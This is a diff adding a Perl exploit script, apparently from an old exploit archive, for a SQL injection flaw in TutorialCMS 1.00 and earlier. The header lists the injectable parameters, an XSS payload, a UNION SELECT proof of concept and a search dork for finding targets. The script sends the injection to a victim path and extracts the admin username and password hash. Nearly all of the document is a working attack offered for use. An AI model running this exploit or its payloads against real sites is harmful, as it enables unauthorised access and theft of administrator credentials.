@@ -1,0 +1,80 @@
+#!/usr/bin/perl -w
+
+#################################################################################
+#										#
+#		     TutorialCMS <= 1.00 SQL Injection Exploit			#
+#										#
+# Discovered by: Silentz							#
+# Payload: Admin Username & Hash Retrieval					#
+# Website: http://www.w4ck1ng.com						#
+# 										#
+# Vulnerable Code (search.php):							#
+#										#
+#      $search = $_REQUEST['search'];						#
+#      $sql    = "SELECT * FROM tutorials WHERE title LIKE '%$search%' 		#
+#		  ORDER BY hits DESC LIMIT $startID , $perPage"; 		#
+#										#
+# Manual SQL Injection:								#
+#      										#
+#      	browseCat.php?catFile=[SQL QUERY]					#
+#	browseSubCat.php?catFile=[SQL QUERY]					#
+#	openTutorial.php?id=[SQL QUERY]						#
+#	search.php?search=[SQL QUERY]						#
+#	topFrame.php?id=[SQL QUERY]						#
+#	admin/editListing.php?id=[SQL QUERY]					#
+#										#
+# NOTE: All above parameters are vulnerable to XSS, so try:			#
+#										#
+#	search.php?search="><script>alert('http://www.w4ck1ng.com')</script>	#		
+#										#
+# PoC: http://victim.com/search.php?search=' UNION SELECT 0,0,0,0,username,	#
+#      password,0,0,0,0,0,0,0 FROM users WHERE id='1' /*			#
+# 										#
+# Subject To: magic_quotes_gpc set to off					#
+# GoogleDork: "Powered By Photoshop Tutorials" (0 Results)			#
+#										#
+# Shoutz: The entire w4ck1ng community						# 
+#										#
+#################################################################################
+
+use LWP::UserAgent;
+if (@ARGV < 1){
+print "-------------------------------------------------------------------------\r\n";
+print "                 TutorialCMS <= 1.00 SQL Injection Exploit\r\n";
+print "-------------------------------------------------------------------------\r\n";
+print "Usage: w4ck1ng_tutorialcms.pl [PATH]\r\n\r\n";
+print "[PATH] = Path where TutorialCMS is located\r\n\r\n";
+print "e.g. w4ck1ng_tutorialcms.pl http://victim.com/tutorialcms/\r\n";
+print "-------------------------------------------------------------------------\r\n";
+print "            		 http://www.w4ck1ng.com\r\n";
+print "            		        ...Silentz\r\n";
+print "-------------------------------------------------------------------------\r\n";
+exit();
+}
+
+$useragent = LWP::UserAgent->new() or die "Could not initialize browser\n";
+$useragent->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
+
+$sql = $ARGV[0] . "search.php?search=' UNION SELECT 0,0,0,0,username,password,0,0,password,0,password,0,0 FROM users WHERE id='1' /*";
+$result = $useragent->request(HTTP::Request->new(GET=>$sql));
+
+if($result->content =~ /"><b><u>([0-9a-zA-Z]+)<\/u>/){
+print "-------------------------------------------------------------------------\r\n";
+print "                 TutorialCMS <= 1.00 SQL Injection Exploit\r\n";
+print "-------------------------------------------------------------------------\r\n";
+print "[+] Admin User : $1\n";
+}
+
+else {print "\n[-] Unable to retrieve admin username..."}
+
+if($result->content =~ /([0-9a-fA-F]{32})/){
+print "[+] Admin Hash : $1\n";
+print "-------------------------------------------------------------------------\r\n";
+print "            		 http://www.w4ck1ng.com\r\n";
+print "            		        ...Silentz\r\n";
+print "-------------------------------------------------------------------------\r\n";
+}
+
+else {print "\n[-] Unable to retrieve admin hash...\n";}
+
+# milw0rm.com [2007-05-09]
